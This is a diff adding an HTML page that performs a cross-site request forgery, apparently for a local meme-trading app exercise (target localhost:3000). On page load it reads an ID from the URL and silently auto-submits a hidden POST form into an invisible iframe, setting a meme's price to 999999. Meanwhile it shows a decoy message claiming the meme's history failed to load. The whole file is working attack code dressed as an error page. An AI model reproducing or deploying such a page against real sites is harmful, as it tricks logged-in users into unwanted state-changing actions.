@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Page Title</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='main.css'>
+    <script src='main.js'></script>
+</head>
+<script>
+    function getID() {
+      let x = document.URL;
+      let arr = x.split('/');
+      return arr[arr.length - 1]; 
+    }
+    function OL() {
+        var action = 'http://localhost:3000/meme/' + getID();
+        document.CSRForm.action = action;
+        document.CSRForm.submit();
+    }
+    </script>
+<body bgcolor="aquamarine" onload="OL()">
+    <h1>Sorry, we couldn't load history of this meme.</h1>
+    <form action="..." method="POST"  target="hiddenFrame" name="CSRForm">
+        <input type="hidden" name="price" value="999999"/>
+    </form>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+</body>
+</html>
